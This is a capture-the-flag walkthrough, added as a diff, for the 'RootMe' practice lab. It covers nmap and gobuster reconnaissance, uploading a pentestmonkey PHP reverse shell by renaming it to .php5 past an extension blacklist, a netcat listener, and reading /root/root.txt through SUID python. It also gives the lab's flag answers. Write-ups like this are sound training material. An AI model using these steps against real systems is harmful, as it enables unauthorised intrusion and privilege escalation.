@@ -1,0 +1,103 @@
+/// RootMe ///
+
+Task 2 {Reconnaissance}
+
+Initial Nmap Scan:
+
+nmap -sV -T4 [machine IP]   
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-20 14:12 EST
+Nmap scan report for [machine IP]
+Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Question 1: Scan the machine, how many ports are open?
+Answer: 2 (22 and 80)
+
+Question 2: What version of Apache is running?
+Answer: 2.4.29
+
+Question 3: What service is running on port 22?
+Answer: ssh
+
+Question 4: Find directories on the web server using the Gobuster tool
+No Answer needed
+
+Syntax: gobuster dir -u 10.10.27.12:80 -t 250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Output:
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.27.12:80
+[+] Method:                  GET
+[+] Threads:                 250
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/01/20 14:13:07 Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 308] [--> http://10.10.27.12/css/]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.27.12/js/] 
+/panel                (Status: 301) [Size: 310] [--> http://10.10.27.12/panel/]
+
+Question 5: What is the hidden directory?
+Answer: /panel/
+
+Task 3 {Getting a shell}
+
+Question 1: user.txt
+
+For our reverse shell, we will just be using the php-reverse-shell from pentestmonkey
+(https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php if you need the script)
+Be sure to change $ip to your tun0 address, and $port to your listening port.
+
+Start a listener: 
+nc -lvnp [port]
+
+Changing the magic number to disguise the file as an image file did not seem to work, nor did adding an image extension.
+However, it seems to be a blacklist as opposed to a whitelist.
+It says php is not allowed, but changing the extension to .php5 bypassed this.
+Upload, and click the link that appears to execute the shell.
+
+user.txt is in /var/www/
+
+Answer: THM{y0u_g0t_a_sh3ll}
+
+
+Task 4 {Privilege escalation}
+
+Question 1: 
+Search for files with SUID permission, which file is weird?
+
+Syntax: find / -type f -perm -04000 -ls 2>/dev/null
+
+Answer: /usr/bin/python
+
+Question 2: Find a form to escalate your privileges.
+No Answer needed
+
+Question 3: root.txt
+
+Checking out python on gtfobins, there is a way in which we can read restricted files:
+
+File read
+
+It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+    python -c 'print(open("file_to_read").read())'
+
+Making an educated guess, we can assume that root.txt is most likely in /root/root.txt
+
+python -c 'print(open("/root/root.txt").read())'
+
+And we get our last flag:
+
+Answer: THM{pr1v1l3g3_3sc4l4t10n}
+
+
